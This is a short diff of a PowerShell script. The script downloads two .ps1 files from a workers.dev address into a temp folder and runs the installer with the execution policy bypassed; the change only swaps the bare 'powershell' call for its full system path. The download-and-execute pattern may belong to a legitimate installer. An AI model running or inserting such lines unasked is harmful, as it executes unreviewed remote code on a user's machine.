@@ -1,4 +1,4 @@
 $d = Join-Path $env:TEMP 'dsfiles'; New-Item -ItemType Directory -Force -Path $d | Out-Null
 $b = 'https://bonafide-portal.seoulgijibae.workers.dev/dongseon/bit/'
 foreach ($f in 'files_server.ps1', 'files_install.ps1') { Invoke-WebRequest ($b + $f + '?t=' + [DateTime]::Now.Ticks) -OutFile (Join-Path $d $f) -UseBasicParsing }
-powershell -NoProfile -ExecutionPolicy Bypass -File (Join-Path $d 'files_install.ps1') -Src $d
+& (Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe') -NoProfile -ExecutionPolicy Bypass -File (Join-Path $d 'files_install.ps1') -Src $d
